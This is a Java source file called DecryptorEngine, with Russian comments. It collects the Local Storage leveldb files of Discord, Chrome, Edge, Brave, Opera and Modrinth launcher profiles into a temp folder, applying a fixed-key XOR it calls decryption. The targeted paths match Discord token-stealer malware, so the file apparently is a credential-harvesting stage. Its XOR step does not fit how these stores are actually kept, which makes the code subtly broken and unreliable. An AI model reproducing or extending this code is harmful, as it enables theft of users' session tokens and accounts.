import java.io.*;
import java.nio.file.*;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.*;

public class DecryptorEngine {
    private static final String TEMP_DIR = System.getenv("TEMP") + "\\SWILL_DEC";
    private static final byte[] KEY = "SwillWay2025Key42".getBytes();
    private static int fileCount = 0;
    
    private static void log(String msg) {
        String timestamp = LocalDateTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss"));
        System.out.println("[Decryptor][" + timestamp + "] " + msg);
    }
    
    public static void main(String[] args) {
        log("DecryptorEngine v3.0 started");
        new File(TEMP_DIR).mkdirs();
        log("Temp dir: " + TEMP_DIR);
        
        // Очищаем старые файлы, чтобы не было дублей
        cleanOldFiles();
        
        scanAndDecrypt();
        
        log("Scan complete. Total files decrypted: " + fileCount);
    }
    
    private static void cleanOldFiles() {
        File dir = new File(TEMP_DIR);
        File[] files = dir.listFiles();
        if (files != null) {
            for (File f : files) {
                if (f.isFile() && f.getName().endsWith(".dec")) {
                    f.delete();
                    log("Deleted old: " + f.getName());
                }
            }
        }
    }
    
    private static void scanAndDecrypt() {
        List<String> targetPaths = new ArrayList<>();
        
        // Стандартные пути
        targetPaths.add(System.getenv("APPDATA") + "\\discord\\Local Storage\\leveldb");
        targetPaths.add(System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb");
        targetPaths.add(System.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb");
        targetPaths.add(System.getenv("APPDATA") + "\\discordptb\\Local Storage\\leveldb");
        targetPaths.add(System.getenv("APPDATA") + "\\discordcanary\\Local Storage\\leveldb");
        targetPaths.add(System.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb");
        targetPaths.add(System.getenv("LOCALAPPDATA") + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb");
        targetPaths.add(System.getenv("USERPROFILE") + "\\AppData\\Roaming\\discord\\Local Storage\\leveldb");
        
        // Поиск в папках Modrinth и лаунчеров
        String userHome = System.getProperty("user.home");
        targetPaths.add(userHome + "\\AppData\\Roaming\\ModrinthApp\\profiles\\*\\discord\\Local Storage\\leveldb");
        
        for (String path : targetPaths) {
            if (path == null) continue;
            
            // Поддержка wildcard
            if (path.contains("*")) {
                String basePath = path.substring(0, path.indexOf("*"));
                File baseDir = new File(basePath);
                if (baseDir.exists() && baseDir.isDirectory()) {
                    File[] subDirs = baseDir.listFiles(File::isDirectory);
                    if (subDirs != null) {
                        for (File subDir : subDirs) {
                            String newPath = path.replace("*", subDir.getName());
                            processDirectory(newPath);
                        }
                    }
                }
            } else {
                processDirectory(path);
            }
        }
    }
    
    private static void processDirectory(String path) {
        File dir = new File(path);
        if (!dir.exists() || !dir.isDirectory()) {
            return;
        }
        
        log("Found: " + path);
        File[] files = dir.listFiles((d, n) -> n.endsWith(".log") || n.endsWith(".ldb"));
        if (files == null || files.length == 0) {
            log("No .log/.ldb files in " + path);
            return;
        }
        
        for (File f : files) {
            try {
                byte[] data = Files.readAllBytes(f.toPath());
                // XOR расшифровка
                for (int i = 0; i < data.length; i++) {
                    data[i] ^= KEY[i % KEY.length];
                }
                
                String outName = dir.getName() + "_" + f.getName() + ".dec";
                String outPath = TEMP_DIR + "\\" + outName;
                Files.write(Paths.get(outPath), data);
                fileCount++;
                log("Decrypted: " + f.getName() + " -> " + outName + " (" + data.length + " bytes)");
                
            } catch (Exception e) {
                log("Error decrypting " + f.getName() + ": " + e.getMessage());
            }
        }
    }
}
